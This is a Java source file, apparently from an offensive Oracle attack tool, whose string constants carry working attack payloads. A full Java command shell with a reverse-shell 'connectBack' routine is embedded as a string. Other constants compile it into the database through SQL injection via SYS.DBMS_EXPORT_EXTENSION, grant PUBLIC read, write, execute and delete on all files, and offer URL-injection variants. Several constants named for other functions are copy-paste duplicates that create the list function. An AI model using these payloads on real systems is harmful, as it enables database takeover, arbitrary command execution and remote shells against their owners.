
public class SQLConstant {
    public static final String SHELL =  " import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.File; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; import java.io.OutputStream; import java.io.OutputStreamWriter; import java.net.Socket; import java.util.Date; public class Shell { public Shell() { } public static String run(String methodName, String params, String encoding) { String result = \"\"; if (methodName.equalsIgnoreCase(\"exec\")) { result = exec(params, encoding); } else if (methodName.equalsIgnoreCase(\"list\")) { result = list(params, encoding); } else if (methodName.equalsIgnoreCase(\"getCurrentDir\")) { result = getCurrentDir(); } else if (methodName.equalsIgnoreCase(\"connectBack\")) { String ip = params.substring(0, params.indexOf(\"^\")); String port = params.substring(params.indexOf(\"^\") + 1); result = connectBack(ip, Integer.parseInt(port)); } else { result = \"unkown methodName\"; } return result; } public static String exec(String cmd, String encoding) { String result = \"\"; if (encoding == null || encoding.equals(\"\")) { encoding = \"utf-8\"; } try { Process p = Runtime.getRuntime().exec(cmd); try { p.waitFor(); } catch (InterruptedException var8) { result = result + var8.getMessage(); var8.printStackTrace(); } InputStream fis; if (p.exitValue() == 0) { fis = p.getInputStream(); } else { fis = p.getErrorStream(); } InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); for(String line = null; (line = br.readLine()) != null; result = result + line + \"\\n\") { } } catch (IOException var9) { result = result + var9.getMessage(); } return result; } public static String list(String path, String encoding) { String result = \"\"; if (encoding == null || encoding.equals(\"\")) { encoding = \"utf-8\"; } File file = new File(path); File[] items = file.listFiles(); for(int i = 0; i < items.length; ++i) { File item = items[i]; String type = item.isDirectory() ? \"<DIR>\" : \"\"; String size = item.isDirectory() ? \"\" : item.length() / 1024L + \"KB\"; if (size.equals(\"0KB\")) { size = item.length() + \"Byte\"; } String date = (new Date(item.lastModified())).toLocaleString(); date = date.replace(\" \",\"\"); result = result + date + \" \" + type + size + \" \" + item.getName() + \"\\n\"; result = result.replace(\" \",\" \"); result = result.replace(\" \",\" \"); } return result; } public static String getCurrentDir() { String result = \"\"; File directory = new File(\"\"); try { result = directory.getAbsolutePath(); } catch (Exception var3) { } return result; } public static String connectBack(String ip, int port) { try { String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/bash\"); } else { ShellPath = new String(\"cmd.exe\"); } Socket socket = new Socket(ip, port); Process process = Runtime.getRuntime().exec(ShellPath); class StreamConnector extends Thread { InputStream sp; OutputStream gh; StreamConnector(InputStream sp, OutputStream gh) { this.sp = sp; this.gh = gh; } public void run() { BufferedReader xp = null; BufferedWriter ydg = null; try { xp = new BufferedReader(new InputStreamReader(this.sp)); ydg = new BufferedWriter(new OutputStreamWriter(this.gh)); char[] buffer = new char[8192]; int length; while((length = xp.read(buffer, 0, buffer.length)) > 0) { ydg.write(buffer, 0, length); ydg.flush(); } } catch (Exception var6) { } try { if (xp != null) { xp.close(); } if (ydg != null) { ydg.close(); } } catch (Exception var5) { } } } (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start(); (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start(); } catch (Exception var5) { } return \"^OK^\"; } public static String getDriveList() { String result = \"\"; File[] roots = File.listRoots(); for(int i = 0; i < roots.length; ++i) { result = result + roots[i].getAbsolutePath() + \"^\"; } return result; } } ";
    public static final String CREATE_SOURCE = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"dphz\" as "   + SHELL +      ";';EXECUTE IMMEDIATE v_command;END;";
    public static final String CREATE_EXEC_FUNCTION = "create or replace function exec(cmd varchar2,encoding varchar2) return varchar2 as language java name 'Shell.exec(java.lang.String,java.lang.String) return java.lang.String';";
    public static final String CREATE_LIST_FUNCTION = "create or replace function list(path varchar2,encoding varchar2) return varchar2 as language java name 'Shell.list(java.lang.String,java.lang.String) return java.lang.String';";
    public static final String CALL_EXEC = "select exec('ifconfig','gbk') from dual";
    public static final String CALL_LIST = "select list('/','gbk') from dual";
    public static final String SYS_CREATE_SOURCE = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"dphz\" as "   + SHELL + ";'''';END;'';END;--','SYS',0,'1',0) from dual";
    public static final String SYS_CREATE_FUNCTION = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function run(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual";
    public static final String CREATE_FUNCTION = "create or replace function run(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name 'Shell.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
    public static final String GRANT_JAVA_EXEC = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
    public static final String SYS_CREATE_EXEC_FUNCTION = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function exec(cmd varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.exec(java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual";
    public static final String SYS_CREATE_LIST_FUNCTION = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function list(cmd varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.list(java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual;";
    public static final String SYS_CREATE_GETCURRENTDIR_FUNCTION = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function list(cmd varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.list(java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual;";
    public static final String SYS_CREATE_CONNECTBACK_FUNCTION = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function list(cmd varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.list(java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual;";
    public static final String SYS_GRANT_EXEC = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant execute on run to public'''';END;'';END;--','SYS',0,'1',0) from dual";
    public static final String test = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"dphz\" as " + SHELL + ";'''';END;'';END;--','SYS',0,'1',0) from dual";
    public static final String URL_CREATE_SOURCE = "and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"dphz\" as  "+ SHELL + ";'''';END;'';END;--','SYS',0,'1',0)='' ";
    public static final String URL_CREATE_FUNCTION = "and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function run(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name ''''''''Shell.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0)='' ";
    public static final String URL_GRANT_FUNCTION = "and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant execute on run to public'''';END;'';END;--','SYS',0,'1',0)='' ";
    public static final String URL_CALL_FUNCTION = "and ''||sys.run('%s','%s','%s')='' ";
    public static final String DROP_JAVA_SOURCE = "drop java source \"dphz\"  ";

    public SQLConstant() {
    }
}
